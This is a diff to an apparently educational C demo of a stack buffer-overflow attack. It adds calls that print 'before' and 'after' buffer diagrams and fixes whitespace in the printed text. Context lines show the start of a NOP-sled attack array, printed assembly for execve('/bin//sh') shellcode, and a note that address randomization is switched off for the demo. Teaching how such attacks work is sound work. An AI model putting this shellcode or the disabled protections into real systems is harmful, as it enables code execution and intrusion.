@@ -9,6 +9,8 @@
 #include <string.h>
 #include <ctype.h>
 
+#include "diagrams.h"
+
 char attack[160] = {
 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
@@ -186,6 +188,7 @@ int main(void) {
 	wait_for_enter();
 
 	/* print buffer diagram of "before attack" */
+	print1();
 
 	wait_for_enter();
 
@@ -202,7 +205,7 @@ int main(void) {
 		"\tmov     edx, esp    ; edx now has address of NULL byte\n"
 		"\tpush    ebx         ; Pushing address of /bin//sh\n"
 		"\tmov     ecx, esp    ; ecx now has address of address\n"
-		"\t		       ; of /bin//sh byte\n"
+		"\t                    ; of /bin//sh byte\n"
 		"\tmov     al, 11      ; syscall number of execve is 11\n"
 		"\tint     0x80        ; Make the system call\n\n"
 	);
@@ -221,7 +224,7 @@ int main(void) {
 	printf( "Importantly, for this demo we need to disable some compiler\n"
 		"and operating system protections. These are usually enabled\n"
 		"for us by default, due to how dangerous and prevalent these\n"
-		" type of attacks are:\n"
+		"type of attacks are:\n"
 		"\n"
 		"We've disabled address space randomization using:\n"
 		"\n"
@@ -235,6 +238,7 @@ int main(void) {
 	wait_for_enter();
 
 	/* print buffer diagram of "after attack" */
+	print2();
 
 	wait_for_enter();
 
